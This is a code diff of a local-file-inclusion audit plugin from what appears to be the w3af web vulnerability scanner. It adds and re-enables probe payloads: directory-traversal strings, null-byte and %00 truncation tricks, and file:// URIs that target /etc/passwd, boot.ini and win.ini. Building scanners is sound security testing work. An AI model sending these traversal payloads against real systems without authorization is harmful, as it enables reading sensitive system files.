@@ -83,10 +83,10 @@ class lfi(AuditPlugin):
 
         # I will only try to open these files, they are easy to identify of they
         # echoed by a vulnerable web app and they are on all unix or windows
-        # default installs. Feel free to mail me ( Andres Riancho ) if you know
+        # default installs. Feel free to mail me (Andres Riancho) if you know
         # about other default files that could be installed on AIX ? Solaris ?
         # and are not /etc/passwd
-        if cf.cf.get('target_os') in ['unix', 'unknown']:
+        if cf.cf.get('target_os') in {'unix', 'unknown'}:
             local_files.append("../" * 15 + "etc/passwd")
             local_files.append("../" * 15 + "etc/passwd\0")
             local_files.append("../" * 15 + "etc/passwd\0.html")
@@ -94,23 +94,32 @@ class lfi(AuditPlugin):
 
             # This test adds support for finding vulnerabilities like this one
             # http://website/zen-cart/extras/curltest.php?url=file:///etc/passwd
-            #local_files.append("file:///etc/passwd")
+            local_files.append("file:///etc/passwd")
 
             local_files.append("/etc/passwd\0")
             local_files.append("/etc/passwd\0.html")
+
             if extension != '':
                 local_files.append("/etc/passwd%00." + extension)
                 local_files.append("../" * 15 + "etc/passwd%00." + extension)
 
-        if cf.cf.get('target_os') in ['windows', 'unknown']:
+        if cf.cf.get('target_os') in {'windows', 'unknown'}:
             local_files.append("../" * 15 + "boot.ini\0")
             local_files.append("../" * 15 + "boot.ini\0.html")
+
             local_files.append("C:\\boot.ini")
             local_files.append("C:\\boot.ini\0")
             local_files.append("C:\\boot.ini\0.html")
+
             local_files.append("%SYSTEMROOT%\\win.ini")
             local_files.append("%SYSTEMROOT%\\win.ini\0")
             local_files.append("%SYSTEMROOT%\\win.ini\0.html")
+
+            # file:// URIs for windows
+            # http://blogs.msdn.com/b/ie/archive/2006/12/06/file-uris-in-windows.aspx
+            local_files.append("file:///C:/boot.ini")
+            local_files.append("file:///C:/win.ini")
+
             if extension != '':
                 local_files.append("C:\\boot.ini%00." + extension)
                 local_files.append("%SYSTEMROOT%\\win.ini%00." + extension)
